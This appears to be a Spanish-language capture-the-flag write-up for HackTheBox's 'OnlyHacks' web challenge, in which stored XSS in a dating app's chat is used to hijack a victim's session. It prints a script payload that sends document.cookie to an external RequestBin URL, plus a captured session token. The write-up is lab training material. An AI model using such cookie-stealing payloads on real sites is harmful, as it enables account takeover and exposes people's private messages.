+++ 
draft = false
date = 2026-04-02T03:31:41Z
title = "OnlyHacks Web Challenge - HackTheBox"
description = "Este es un Challenge Web de la plataforma HackTheBox, el cual toca la vulnerabilidad XSS stored, aplicandolo en un Cookie Hijacking"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-------------------------
- Tags: #Challenge #XSS #VeryEasy #Cookie
----------------
# Introducción

En este writeup detallaremos la resolución del challenge web `OnlyHacks` de HackTheBox. Nos enfrentamos a una aplicación web de citas que permite a los usuarios registrarse, interactuar mediante `matches` y enviarse mensajes privados.

Durante la fase de enumeración, descubriremos que el sistema de chat no sanitiza correctamente la entrada del usuario, permitiendo la inyección de etiquetas HTML. Escalaremos esta vulnerabilidad a un `XSS Stored` para inyectar código JavaScript malicioso. Dado que el laboratorio opera sin VPN directa, utilizaremos un servicio externo (`Request Bin`) para exfiltrar datos de forma `Out of Band` (OOB). El objetivo final será robar la cookie de sesión de una víctima, realizar un `Cookie Hijacking` para tomar control de su cuenta y, finalmente, acceder a sus mensajes privados para capturar la `flag`.

# Solución

Empezamos el desafío con la IP que nos proporciona `HackTheBox`, la cual es `154.57.164.78:32621`.

Al entrar a la IP nos encontramos con la siguiente página web

<img src="/images/Pasted image 20260402000024.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que podemos iniciar sesión y registrarnos, como no tenemos credenciales válidas procedemos a registrarnos

**NOTA:** Por alguna razón, para que nuestro registro funcione, es necesario subir una foto en `Profile Picture`

<img src="/images/Pasted image 20260402000212.png" style="width:100%; height:auto; display:block; margin:auto;">

Una vez registrados entraremos al `Dashboard`, donde nos aparecen personas a las que podemos darle match o no

<img src="/images/Pasted image 20260402000300.png" style="width:100%; height:auto; display:block; margin:auto;">

Si vamos a `Matches` nos aparecen los match con sus respectivos chats

<img src="/images/Pasted image 20260402000331.png" style="width:100%; height:auto; display:block; margin:auto;">

En el chat procedemos a probar si el campo interpreta etiquetas html con el siguiente payload

```html
Hola,<h1>amiga</h1>
```

Y vemos que la web lo interpreta, lo cual da señal de la mala implementación de la web

<img src="/images/Pasted image 202604020006511.png" style="width:100%; height:auto; display:block; margin:auto;">

## Explotando XSS

Sabiendo que la web interpreta las etiquetas HTML ahora podemos probar si es que es vulnerable a `XSS`, con el siguiente payload

```bash
que tal <script>alert('XSS')</script>
```

Vemos que nos aparece la alerta, por lo cual concluimos que la web es vulnerable a un ataque `XSS`

<img src="/images/Pasted image 20260402000900.png" style="width:100%; height:auto; display:block; margin:auto;">

## Cookie Hijacking

Sabiendo que la web interpreta código `Javascript`, podemos insertar un payload que robe la cookie de la persona que vea el mensaje.
El problema radica en el funcionamiento del laboratorio, como no estamos conectados por `VPN`, no tenemos forma de utilizar nuestra IP para obtener la petición mediante la cual obtendríamos la cookie, por lo tanto utilizaremos la web `Request Bin` (https://requestbin.whapi.cloud/)

Le damos a `Create a RequestBin`

<img src="/images/Pasted image 20260402001324.png" style="width:100%; height:auto; display:block; margin:auto;">

y copiamos el link que nos aparece en la parte superior derecha

<img src="/images/Pasted image 20260402001415.png" style="width:100%; height:auto; display:block; margin:auto;">

Este link `http://requestbin.whapi.cloud/1se0hy01` lo integraremos a nuestro payload para obtener la cookie de la víctima.

El payload que utilizaremos es el siguiente

```bash
<script>document.location='http://requestbin.whapi.cloud/1se0hy01/index.php?c='+document.cookie;</script>
```

Lo mandamos en el chat de la siguiente forma

<img src="/images/Pasted image 20260402001628.png" style="width:100%; height:auto; display:block; margin:auto;">

y al recargar la página de `Request Bin`, obtenemos la petición con la Cookie de sesión de la víctima `eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6ImNlbGVybzAifX0.ac3cOA.JkuMO5aS_6oFkXOIyXaHvjC5Kis`

<img src="/images/Pasted image 20260402002020.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora podemos reemplazar nuestra cookie, por la que obtuvimos de la víctima

<img src="/images/Pasted image 20260402001958.png" style="width:100%; height:auto; display:block; margin:auto;">

Y recargando la página, entramos al perfil de la víctima

<img src="/images/Pasted image 20260402002131.png" style="width:100%; height:auto; display:block; margin:auto;">

Donde podemos leer sus chats privados, encontrando la `flag` y terminando el `Challenge`

<img src="/images/Pasted image 20260402002155.png" style="width:100%; height:auto; display:block; margin:auto;">
